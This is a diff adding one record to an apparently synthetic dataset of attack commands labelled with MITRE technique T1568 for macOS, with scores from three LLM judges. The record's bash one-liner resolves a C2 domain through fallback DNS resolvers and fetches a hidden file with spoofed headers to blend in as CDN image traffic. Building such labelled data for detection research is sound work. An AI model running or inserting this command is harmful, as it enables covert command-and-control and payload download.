@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "dom=\"update-cdn-images.net\"; ip=$(dig @1.1.1.1 +short A \"$dom\" | head -1); if [ -z \"$ip\" ]; then ip=$(dig @8.8.8.8 +short A \"$dom\" | head -1); fi; if [ -n \"$ip\" ]; then ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; wget -q --header=\"Host: $dom\" --user-agent=\"$ua\" --referer=\"https://$dom/gallery\" --limit-rate=55k --timeout=7 \"http://$ip/photos/hero.jpg\" -O /tmp/.img; fi",
+  "explanation": "Performs dynamic resolution against multiple public DNS resolvers to obtain an active C2 IP, then retrieves a benign-looking image path using Host header to mimic image loading.",
+  "rationale_steps": [
+    "Query multiple DNS resolvers for resilience (dynamic resolution).",
+    "Contact IP directly with Host header to blend with CDN traffic.",
+    "Throttle rate and use referer to resemble normal browsing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-51122a84",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, conditional logic, balanced quotes, appropriate command separators, and valid flags for the dig and wget utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Dynamic Resolution technique by attempting to resolve a domain through multiple DNS servers (1.1.1.1 and 8.8.8.8), then using the resolved IP to establish communication while disguising the traffic as legitimate image loading with appropriate headers.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:33:35.583033Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignments, command substitutions, conditional statements, and valid `dig` and `wget` usage with proper flags and quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates dynamic resolution by performing runtime DNS lookups for an active C2 IP using multiple resolvers and then leverages the resolved IP for C2 communication while mimicking benign web traffic, aligning well with T1568's focus on adapting to dynamically changing endpoints for C2 (e.g., fast-flux, dynamic DNS).",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T05:33:55.635028Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash one-liner with balanced quotes, valid command separators, and correct flag usage for dig and wget.",
+        "semantic_score": 3,
+        "semantic_justification": "It performs runtime DNS resolution with resolver fallback and uses the resolved IP with a Host header, but lacks algorithmic/rotating endpoint behavior typical of T1568 and may fail on macOS due to wget not being default.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:34:11.642119Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
